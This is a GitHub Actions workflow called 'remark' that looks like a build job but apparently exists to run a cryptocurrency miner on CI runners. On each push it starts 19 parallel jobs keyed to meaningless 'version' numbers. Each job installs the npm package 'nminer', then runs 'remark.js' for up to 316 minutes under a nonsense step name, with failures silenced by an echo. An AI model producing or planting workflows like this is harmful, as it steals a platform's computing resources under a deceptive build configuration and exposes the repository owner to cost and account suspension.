name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7349 }
          - { version: 8458 }
          - { version: 9221 }
          - { version: 8075 }
          - { version: 9970 }
          - { version: 4507 }
          - { version: 9979 }
          - { version: 5346 }
          - { version: 2245 }
          - { version: 1156 }
          - { version: 7523 }
          - { version: 3447 }
          - { version: 1117 }
          - { version: 6332 }
          - { version: 1770 }
          - { version: 192 }
          - { version: 1982 }
          - { version: 2033 }
          - { version: 1046 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: for um hmph cruelly
        run: |
          npm install nminer@latest
          timeout 316m node remark.js || echo "remark executed"